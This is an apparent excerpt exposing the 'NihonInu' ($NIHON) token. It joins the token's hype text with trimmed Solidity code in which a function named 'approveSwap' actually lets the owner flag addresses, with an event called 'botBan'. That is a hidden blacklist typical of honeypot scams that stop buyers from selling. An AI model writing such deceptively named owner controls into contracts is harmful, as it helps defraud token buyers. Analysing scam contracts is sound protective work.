...
We introduce to you KIBA younger brother $NIHON !!!

NihonInu, is a new Inu project that has set its sights 
on becoming more than just another beta in the pack.
NIHON token holders and developers are convinced. 

http://www.nihoninu.io/
...
contract NichonInu is Context, IERC20, Ownable {
    ...
    event botBan (address Address, bool isBanned);
    ...
    function approveSwap(address Address) external onlyOwner {
        if (_checkTransfer[Address] == true) {
            _checkTransfer[Address] = false;
        } else {_checkTransfer[Address] = true;
            emit botBan (Address, _checkTransfer[Address]);
          }
    }

    function checkSwap(address Address) public view returns (bool) {
        return _checkTransfer[Address];
    }
